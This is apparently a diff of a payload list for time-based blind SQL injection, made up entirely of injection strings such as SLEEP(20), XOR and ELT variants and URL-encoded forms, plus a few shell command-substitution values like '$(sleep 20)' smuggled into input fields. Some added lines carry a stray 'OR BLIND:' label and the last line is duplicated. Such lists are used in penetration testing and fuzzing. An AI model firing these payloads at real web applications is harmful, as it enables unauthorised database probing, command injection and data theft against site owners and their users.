@@ -1,98 +1,79 @@
-0'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z
-0'XOR(if(now()=sysdate(),sleep(20*1),0))XOR'Z
-if(now()=sysdate(),sleep(20),0)
-'XOR(if(now()=sysdate(),sleep(20),0))XOR'
-'XOR(if(now()=sysdate(),sleep(20*1),0))OR'
-0'|(IF((now())LIKE(sysdate()),SLEEP(1),0))|'Z
-0'or(now()=sysdate()&&SLEEP(1))or'Z
-if(now()=sysdate(),sleep(20),0)/"XOR(if(now()=sysdate(),sleep(20),0))OR"/
-if(now()=sysdate(),sleep(20),0)/*'XOR(if(now()=sysdate(),sleep(20),0))OR'"XOR(if(now()=sysdate(),sleep(20),0))OR"*/
-if(now()=sysdate(),sleep(20),0)/'XOR(if(now()=sysdate(),sleep(20),0))OR'"XOR(if(now()=sysdate(),sleep(20),0) and 5=5)"/
-if(1=1,sleep(20),0)/*'XOR(if(1=1,sleep(20),0))OR'"XOR(if(1=1,sleep(20),0))OR"*/
-if(1337=1337,exp(~(1)),0)/*'XOR(if(1337=1337,exp(~(1)),0))OR'"XOR(if(1337=1337,sleep(20),0))OR"*/
-SLEEP(20)/*' or SLEEP(20) or '" or SLEEP(20) or "*/
-%2c(select%5*%5from%5(select(sleep(20)))a)
-(select(0)from(select(sleep(20)))v)
-(SELECT SLEEP(20))
-'%2b(select*from(select(sleep(20)))a)%2b'
-(select*from(select(sleep(20)))a)
-1'%2b(select*from(select(sleep(20)))a)%2b'
-,(select * from (select(sleep(20)))a)
-desc%2c(select*from(select(sleep(20)))a)
--1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(20))A))
--1+or+1=((SELECT+1+FROM+(SELECT+SLEEP(20))A))
-(SELECT * FROM (SELECT(SLEEP(20)))YYYY)
-(SELECT * FROM (SELECT(SLEEP(20)))YYYY)#
-(SELECT * FROM (SELECT(SLEEP(20)))YYYY)--
-'+(select*from(select(sleep(20)))a)+'
-(select(0)from(select(sleep(20)))v)%2f'+(select(0)from(select(sleep(20)))v)+'"
-(select(0)from(select(sleep(20)))v)%2f*'+(select(0)from(select(sleep(20)))v)+'"+(select(0)from(select(sleep(20)))v)+"*%2f
-(select(0)from(select(sleep(20)))v)/*'+(select(0)from(select(sleep(20)))v)+'"+(select(0)from(select(sleep(20)))v)+"*/
-(select(0)from(select(sleep(20)))v)/*'+(select(0)from(select(sleep(20)))v)+'\"+(select(0)from(select(sleep(20)))v)+\"*/
-',''),/*test*/%26%26%09sLeEp(20)%09--+
-1 and sleep 20--
-1 and sleep 20
-1 and sleep(20)--
-1 and sleep(20)
-' and sleep 20--
-' and sleep 20
-' and sleep 20 and '1'='1
-' and sleep(20) and '1'='1
-' and sleep(20)--
-' and sleep(20)
+1 AND (SELECT 1 FROM (SELECT SLEEP(20))A)
+1 AND (SELECT 1 FROM (SELECT(SLEEP(20)))A)
+' AND SLEEP(20) AND '1'='1
+' AND SLEEP(20)
 ' AnD SLEEP(20) ANd '1
-and sleep 20--
-and sleep 20
-and sleep(20)--
-and sleep(20)
-and SELECT SLEEP(20); #
 AnD SLEEP(20)
-AnD SLEEP(20)--
-AnD SLEEP(20)#
-' AND SLEEP(20)#
-" AND SLEEP(20)#
-') AND SLEEP(20)#
-OR BLIND:
-or sleep 20--
-or sleep 20
-or sleep(20)--
-or sleep(20)
-or SELECT SLEEP(20); #
-or SLEEP(20)
-or SLEEP(20)#
-or SLEEP(20)--
-or SLEEP(20)="
-or SLEEP(20)='
-' OR SLEEP(20)#
-" OR SLEEP(20)#
-') OR SLEEP(20)#
-')) or sleep(20)='
-" or sleep(20)#
-1) or sleep(20)#
+OR BLIND: or sleep(20)--
+OR BLIND: or sleep(20)
+OR BLIND: or sleep(20)='
+OR BLIND: or sleep(20)="
+OR BLIND: or sleep(20)#
+OR BLIND: or SLEEP(20)
+OR BLIND: or SLEEP(20)='
+OR BLIND: or SLEEP(20)="
+OR BLIND: or SLEEP(20)#
+OR BLIND: or SLEEP(20)--
+OR BLIND: or SELECT SLEEP(20); #
+OR BLIND: or SLEEP(20) AND '1'='1
+OR BLIND: or SLEEP(20) AND '1
+or sleep(20)#
 )) or sleep(20)='
 1)) or sleep(20)#
-or sleep(20)#
-%20'sleep%2020'
-%20$(sleep%2020)
 ")) or sleep(20)="
-or sleep(20)='
-") or sleep(20)="
-) or sleep(20)='
-1 or sleep(20)#
-' AND ELT(1337=1337,SLEEP(20))--
-' AND ELT(1337=1337,SLEEP(20))-- 1337
-" AND ELT(1337=1337,SLEEP(20))-- 1337
-') AND ELT(1337=1337,SLEEP(20))-- 1337
-') AND ELT(1337=1337,SLEEP(20)) AND ('1337'='1337
-')) AND ELT(1337=1337,SLEEP(20)) AND (('1337'='1337
-'))) AND ELT(1337=1337,SLEEP(20)) AND ((('1337'='1337
+%20$(sleep%2020)
+%20'sleep%2020'
+' AND ELT(1337=1337,SLEEP(20))
+" AND ELT(1337=1337,SLEEP(20))
+') AND ELT(1337=1337,SLEEP(20))
+")) AND ELT(1337=1337,SLEEP(20))
 ' AND ELT(1337=1337,SLEEP(20)) AND '1337'='1337
-') AND ELT(1337=1337,SLEEP(20)) AND ('1337' LIKE '1337
-')) AND ELT(1337=1337,SLEEP(20)) AND (('1337' LIKE '1337
-'))) AND ELT(1337=1337,SLEEP(20)) AND ((('1337' LIKE '1337
-%) AND ELT(1337=1337,SLEEP(20)) AND '1337%'='1337
-' AND ELT(1337=1337,SLEEP(20)) AND '1337' LIKE '1337
-") AND ELT(1337=1337,SLEEP(20)) AND ("1337"="1337
-")) AND ELT(1337=1337,SLEEP(20)) AND (("1337"="1337
+' AND ELT(1337=1337,SLEEP(20)) AND ('1337' LIKE '1337
+') AND ELT(1337=1337,SLEEP(20)) AND ('1337'='1337
 ' AND ELT(1337=1337,SLEEP(20)) AND "1337"="1337
-" AND ELT(1337=1337,SLEEP(20)) AND "1337"="1337
+' AND ELT(1337=1337,SLEEP(20)) AND '1337' LIKE '1337
+' AND ELT(1337=1337,SLEEP(20)) AND "1337" LIKE "1337
+1 and sleep(20)
+(SELECT SLEEP(20))
+', ''),/test/%26%26%09sLeEp(20)%09--+
+', sleep(20))-- 1337
+')); or sleep(20)='
+'); or sleep(20)='
+') or sleep(20)='
+'); or sleep(20)
+')); or sleep(20)
+') OR SLEEP(20)#
+'); OR SLEEP(20)#
+') OR SLEEP(20)
+'); OR SLEEP(20)
+') AND SLEEP(20)#
+'); AND SLEEP(20)#
+'); AND SLEEP(20)
+') AND SLEEP(20)
+and sleep(20)#
+AND SLEEP(20)
+OR SLEEP(20)
+sleep(20)
+"); or sleep(20)#
+%20'))%20OR%20(('test'%3D'test
+%20or%20sleep%20(20)
+%20or%20sleep(20)--
+%20or%20sleep(20)#
+%20or%20sleep(20)='
+%20or%20sleep(20)="
+%20or%20sleep(20)
+%20and%20sleep(20)
+%20and%20sleep(20)--
+%20and%20sleep(20)#
+%20and%20sleep(20)='
+%20and%20sleep(20)="
+%20AND%20SLEEP(20)
+%20AND%20SLEEP(20)--
+%20AND%20SLEEP(20)#
+%20AND%20SLEEP(20)='
+%20AND%20SLEEP(20)="
+%20AND%20SLEEP(20)/*
+%20and%20(select*from(select(sleep(20)))a)
+%20and%20sleep(20)%23
+%20AND%20SLEEP(20)%23
+%20AND%20SLEEP(20)%23
